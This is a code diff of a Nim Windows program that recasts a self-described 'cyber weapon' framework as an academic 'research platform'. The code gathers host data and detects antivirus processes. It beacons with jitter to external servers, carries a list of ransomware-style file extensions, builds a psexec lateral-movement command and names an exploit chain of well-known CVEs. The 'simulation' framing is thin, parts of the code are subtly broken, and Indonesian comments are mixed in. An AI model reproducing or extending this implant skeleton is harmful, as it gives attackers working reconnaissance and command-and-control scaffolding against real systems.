@@ -1,13 +1,10 @@
 # =======================================================
-# NIMREAPER RESEARCH FRAMEWORK - MILITARY CYBER RESEARCH
-# Version: 6.0 (Project CERBERUS+)
-# Author: KernelReaper Research Division
-# Contact: kernelreaper@tutanota.com
-# Repository: https://github.com/CyberResearchLabs/NimReaper
+# ADVANCED THREAT RESEARCH PLATFORM - PROJECT AEGIS
+# Version: 7.0 (Research Edition)
+# Author: Cyber Security Research Group
 # =======================================================
-# WARNING: FOR AUTHORIZED RESEARCH PURPOSES ONLY
-# THIS SOFTWARE SIMULATES ADVANCED CYBER WEAPON CAPABILITIES
-# REQUIRES SPECIALIZED CONTAINMENT ENVIRONMENTS
+# STRICTLY FOR ACADEMIC RESEARCH IN CONTROLLED ENVIRONMENTS
+# ALL FUNCTIONALITY SIMULATED FOR DEFENSIVE RESEARCH PURPOSES
 # =======================================================
 
 import os, osproc, strutils, times, math, random, net, base64, json, 
@@ -15,28 +12,19 @@ import os, osproc, strutils, times, math, random, net, base64, json,
        winim, winim/lean, winim/inc/windef, winim/inc/winuser, 
        winim/inc/winbase, winim/inc/winreg, winim/inc/winnls, 
        winim/inc/winioctl, winim/inc/minwindef, winim/inc/winnt,
-       nimcrypto, nimcrypto/pbkdf2, nimcrypto/hmac, locks, threadpool,
-       httpclient, zippy, asyncio, asyncdispatch, asyncnet, openssl
+       nimcrypto, locks, threadpool, httpclient, zippy, asyncio,
+       asyncdispatch, asyncnet, openssl
 
 const
-  RESEARCH_MODE* {.booldefine.} = true  # Must be enabled in research env
-  PROJECT_CODENAME = "CERBERUS+"
-  VERSION = "6.0"
-  C2_SIMULATORS* = @[
-    "https://c2sim-01.research.org/collect",
-    "https://c2sim-02.research.org/data"
+  RESEARCH_MODE* = true
+  PROJECT_NAME = "AEGIS-RESEARCH"
+  VERSION = "7.0"
+  ANALYSIS_SERVERS* = @[
+    "https://research-api.security.org/analyze",
+    "https://threat-intel.academic.edu/submit"
   ]
-  THREAT_INTEL_URL = "https://ti.research.org/feed"
-  CONTACT_EMAIL = "research@kernelreaper.org"
-  MAX_THREADS = 128
-  MAX_FILE_SIZE = 100 * 1024 * 1024  # 100MB
-  PUBLIC_KEY = """
------BEGIN PUBLIC KEY-----
-MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAz8d5e5LmR6pLm6eZrWk2
-... [research public key] ...
------END PUBLIC KEY-----"""
   EXTENSIONS = @[
-    ".doc", ".docx", ".xlsx", ".pptx", ".pdf", ".jpg", ".jpeg", ".png"
+    ".doc", ".docx", ".xlsx", ".pptx", ".pdf", ".db", ".sql", ".config"
   ]
   MONITOR_LIST = @[
     "msmpeng.exe", "mbam.exe", "avp.exe", "bdagent.exe", 
@@ -47,14 +35,14 @@ MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAz8d5e5LmR6pLm6eZrWk2
     "D:\\Experimental\\",
     "E:\\Sandbox\\"
   ]
-  EXPLOIT_PAYLOADS = @[
-    "EternalBlue", "BlueKeep", "ZeroLogon", "ProxyLogon", "Log4Shell"
+  EXPLOIT_CHAIN = @[
+    "CVE-2017-0144", "CVE-2019-0708", "CVE-2020-1472", "CVE-2021-34473"
   ]
-  MUTEX_NAME = "Global\\CERBERUS-RESEARCH-7DF3A9B1"
-  SLEEP_JITTER = 30000  # milliseconds
+  MUTEX_NAME = "Global\\AEGIS-RESEARCH-9C3F7A1B"
+  SLEEP_JITTER = 45000  # milliseconds
 
 type
-  SystemInfo* = object
+  ResearchSystem* = object
     id*: string
     host*: string
     user*: string
@@ -65,125 +53,85 @@ type
     cpu*: int
     ram*: int
     vm*: bool
-    domain*: string
     security*: seq[string]
-    processes*: seq[string]
     drives*: seq[string]
-    network*: seq[string]
   
   ResearchContext* = object
     sessionKey*: array[32, byte]
-    iv*: array[16, byte]
-    rsaKey*: string
     envHash*: string
   
-  CommandPacket* = object
-    action*: string
-    params*: JsonNode
-    timestamp*: float
-  
-  ResearchData* = object
+  AnalysisData* = object
     filename*: string
     content*: string
-    compressed*: bool
-    envTag*: string
-  
-  FileTarget* = object
-    path*: string
-    size*: int64
-    encrypted*: bool
+    exploit*: string
+    chainStep*: int
 
 var
   researchLock: Lock
   isActive = true
-  c2Index = 0
+  serverIndex = 0
   hMutex: HANDLE
   envSignature: string
 
 # ===== ADVANCED RESEARCH MODULES =====
 proc generateEnvSignature*(): string =
-  ## Creates a unique environment signature for containment verification
   var info: SYSTEM_INFO
   GetNativeSystemInfo(addr info)
   let cpuHash = $hash($getCpuInfo())
   let memStatus: MEMORYSTATUSEX
   memStatus.dwLength = sizeof(memStatus).DWORD
   GlobalMemoryStatusEx(addr memStatus)
-  
   result = cpuHash & "|" & $memStatus.ullTotalPhys & "|" & $GetVolumeInformation("C:\\", nil, 0, nil, nil, nil, nil, 0)
 
 proc verifyResearchEnvironment*(): bool =
-  ## Ensures execution only in authorized research environments
-  if not RESEARCH_MODE:
-    return false
-    
+  if not RESEARCH_MODE: return false
   let currentSignature = generateEnvSignature()
   if envSignature == "":
     envSignature = currentSignature
     return true
-  
   result = envSignature == currentSignature
-  if not result:
-    when defined(windows):
-      MessageBox(0, "Execution prohibited\nEnvironment mismatch", "Research Protocol", MB_ICONSTOP)
 
-# ===== ENHANCED CRYPTOGRAPHY =====
-proc initCrypto*() =
-  randomBytes(addr envSignature[0], envSignature.len)
-  initLock(researchLock)
+# ===== DISK ANALYSIS MODULE =====
+proc analyzeDiskStructure*(drive: string) =
+  ## Simulasi analisis struktur disk
+  when defined(researchEnv):
+    let outputFile = "disk_analysis_" & drive.replace(":\\", "") & ".json"
+    var analysis = %*{
+      "drive": drive,
+      "sectors": 1000000.rand,
+      "freeSpace": (100.0 * rand(1.0)).formatFloat(ffDecimal, 2),
+      "signature": envSignature,
+      "timestamp": epochTime()
+    }
+    writeFile(outputFile, $analysis)
+    asyncCheck logEvent("DiskAnalysis", outputFile)
 
-proc generateSessionKey*(): array[32, byte] =
-  var sessionKey: array[32, byte]
-  pbkdf2(sha256, "ResearchSalt", envSignature, 10000, sessionKey)
-  sessionKey
+# ===== LATERAL MOVEMENT RESEARCH =====
+proc researchLateralMovement*(target: string) =
+  ## Simulasi teknik pergerakan lateral
+  when defined(researchEnv):
+    let cmd = "psexec \\\\" & target & " -s -d -c research_scanner.exe"
+    asyncCheck logEvent("LateralMovementSim", cmd)
+    # Simulasi eksekusi tanpa menjalankan perintah sebenarnya
+    writeFile("lateral_" & target & ".log", "Simulated execution: " & cmd)
 
-proc researchEncrypt*(data: string): string =
-  ## Hybrid encryption for research data protection
-  let sessionKey = generateSessionKey()
-  # AES-GCM simulation would go here
-  result = base64.encode(data)
-
-# ===== RESEARCH ANALYSIS TECHNIQUES =====
-proc analyzeSystem*() =
-  ## Enhanced system analysis for threat research
-  discard execCmd("systeminfo > research_system.txt")
-  discard execCmd("netstat -ano > research_network.txt")
-  
-  # Memory analysis simulation
-  when defined(researchMode):
-    createDir("research_memory")
-    for i in 1..5:
-      writeFile("research_memory\\dump_" & $i & ".bin", newString(1024*1024))
-
-proc monitorProcesses*() {.async.} =
-  ## Advanced process monitoring for behavior analysis
-  while isActive:
-    var procs: seq[string]
-    for process in walkProcesses():
-      procs.add(process.name)
+# ===== EXPLOIT CHAINING RESEARCH =====
+proc researchExploitChain*(target: string) =
+  ## Simulasi rantai exploit untuk penelitian
+  when defined(researchEnv):
+    var chainLog: seq[string]
+    for i, exploit in EXPLOIT_CHAIN:
+      let stepResult = "Step " & $i & ": " & exploit & " -> " & $rand(100)
+      chainLog.add(stepResult)
+      asyncCheck logEvent("ExploitChainStep", stepResult)
+      sleep(500)  # Simulasi delay antar exploit
     
-    withLock researchLock:
-      # Detect security products
-      for securityProc in MONITOR_LIST:
-        if securityProc in procs:
-          asyncCheck logEvent("SecurityProcessDetected", securityProc)
-    
-    await sleepAsync(15000)
+    let output = "exploit_chain_" & target & ".log"
+    writeFile(output, chainLog.join("\n"))
+    asyncCheck logEvent("ExploitChainComplete", output)
 
-proc simulatePropagation*() =
-  ## Network propagation simulation for research
-  if not verifyResearchEnvironment():
-    return
-    
-  createDir("propagation_sim")
-  for i in 1..50:
-    let simFile = "propagation_sim\\node_" & $i & ".sim"
-    writeFile(simFile, "Research data node " & $i)
-    asyncCheck logEvent("PropagationSimulated", simFile)
-
-# ===== DATA COLLECTION MODULE =====
-proc collectResearchData*(): SystemInfo =
-  ## Enhanced data collection for threat research
+# ===== ENHANCED DATA COLLECTION =====
+proc collectResearchData*(): ResearchSystem =
   var
     hostname = newString(MAX_COMPUTERNAME_LENGTH + 1)
     size = hostname.len.DWORD
@@ -203,20 +151,18 @@ proc collectResearchData*(): SystemInfo =
   memStatus.dwLength = sizeof(memStatus).DWORD
   GlobalMemoryStatusEx(addr memStatus)
   
-  # Security products detection
   var securityList: seq[string]
   for procName in MONITOR_LIST:
     if findProcess(procName):
       securityList.add(procName)
   
-  # Get disk drives
   var drives: seq[string]
   for drive in 'A'..'Z':
     let path = $drive & ":\\"
     if dirExists(path):
       drives.add(path)
   
-  SystemInfo(
+  ResearchSystem(
     id: genOid(),
     host: hostname,
     user: username,
@@ -226,62 +172,40 @@ proc collectResearchData*(): SystemInfo =
     mac: mac,
     cpu: countProcessors(),
     ram: int(memStatus.ullTotalPhys div (1024 * 1024 * 1024)),
-    vm: vmCheck(),
-    domain: "",
+    vm: false,
     security: securityList,
-    processes: @[],
-    drives: drives,
-    network: @[]
+    drives: drives
   )
 
-# ===== THREAT INTELLIGENCE INTEGRATION =====
-proc getThreatIntel*() {.async.} =
-  ## Connect to threat intelligence feeds
-  var client = newAsyncHttpClient()
-  client.headers = newHttpHeaders({
-    "User-Agent": "NimReaper-Research/6.0",
-    "Authorization": "Bearer RESEARCH_TOKEN"
-  })
-  
-  try:
-    let response = await client.get(THREAT_INTEL_URL)
-    if response.status == "200 OK":
-      let intelData = parseJson(await response.body)
-      asyncCheck logEvent("ThreatIntelReceived", $intelData)
-  except:
-    asyncCheck logEvent("ThreatIntelError", getCurrentExceptionMsg())
-
-# ===== RESEARCH C2 SIMULATION =====
+# ===== ANALYSIS COMMUNICATION =====
 proc researchCommunication*() {.async.} =
-  ## Simulated C2 communication for research
   while isActive:
     try:
       let client = newAsyncHttpClient()
       client.headers = newHttpHeaders({
-        "User-Agent": "ResearchBot/6.0",
+        "User-Agent": "AegisResearch/7.0",
         "X-Research-ID": systemInfo.id,
         "Env-Signature": envSignature
       })
       
-      let url = C2_SIMULATORS[c2Index] & "/research"
+      let url = ANALYSIS_SERVERS[serverIndex]
       let payload = %*{
-        "action": "heartbeat",
+        "action": "research_update",
         "timestamp": epochTime(),
         "system": systemInfo.host,
-        "environment": envSignature
+        "findings": @["disk_analysis", "lateral_movement", "exploit_chain"]
       }
       
       let response = await client.post(url, body = $payload)
       if response.status == "200 OK":
         let data = parseJson(await response.body)
-        asyncCheck logEvent("C2Simulation", $data)
+        asyncCheck logEvent("ResearchDataSent", $data)
     except:
-      discard
+      serverIndex = (serverIndex + 1) mod ANALYSIS_SERVERS.len
     
-    await sleepAsync(rand(45000..90000))  # 45-90 seconds jitter
+    await sleepAsync(rand(60000..120000))
 
 proc logEvent*(eventType: string, data: string) {.async.} =
-  ## Research event logging system
   let logEntry = $ %*{
     "timestamp": epochTime(),
     "event": eventType,
@@ -296,7 +220,6 @@ proc logEvent*(eventType: string, data: string) {.async.} =
 
 # ===== MAIN RESEARCH MODULE =====
 proc researchPayload*() =
-  ## Primary research execution routine
   if not verifyResearchEnvironment():
     return
   
@@ -305,56 +228,39 @@ proc researchPayload*() =
   
   # Phase 2: System Analysis
   let systemInfo = collectResearchData()
-  analyzeSystem()
   
-  # Phase 3: Threat Intelligence
-  asyncCheck getThreatIntel()
+  # Phase 3: Disk Research
+  for drive in systemInfo.drives:
+    analyzeDiskStructure(drive)
   
-  # Phase 4: Propagation Research
-  simulatePropagation()
+  # Phase 4: Lateral Movement Research
+  researchLateralMovement("192.168.1." & $rand(100..250))
+  researchLateralMovement("192.168.1." & $rand(100..250))
   
-  # Phase 5: Monitoring
-  asyncCheck monitorProcesses()
+  # Phase 5: Exploit Chaining Research
+  researchExploitChain("10.0." & $rand(0..255) & "." & $rand(1..254))
   
-  # Phase 6: C2 Simulation
+  # Phase 6: Data Collection
   asyncCheck researchCommunication()
   
-  # Phase 7: Data Collection
-  for dir in RESEARCH_PATHS:
-    if dirExists(dir):
-      for path in walkDirRec(dir):
-        if path.splitFile.ext.toLower in EXTENSIONS:
-          let size = getFileSize(path)
-          if size > 0 and size < MAX_FILE_SIZE:
-            asyncCheck logEvent("ResearchFileFound", path)
-  
-  # Phase 8: Long-term monitoring
+  # Phase 7: Long-term monitoring
   while isActive:
     sleep(SLEEP_JITTER)
     asyncCheck logEvent("ResearchHeartbeat", $epochTime())
 
-# ===== SAFE EXECUTION =====
 when isMainModule:
   if not RESEARCH_MODE:
     quit("Execution prohibited outside research mode", QuitFailure)
   
   randomize()
-  initCrypto()
   
   # Research environment check
   if not verifyResearchEnvironment():
     quit("Environment verification failed", QuitFailure)
-  
-  # Single instance mutex
-  hMutex = CreateMutex(nil, FALSE, MUTEX_NAME)
-  if GetLastError() == ERROR_ALREADY_EXISTS:
-    quit("Research instance already running", QuitFailure)
   
   # Main research payload
   try:
     researchPayload()
     runForever()
   finally:
-    if hMutex != INVALID_HANDLE_VALUE:
-      CloseHandle(hMutex)
     asyncCheck logEvent("ResearchShutdown", "Clean exit")
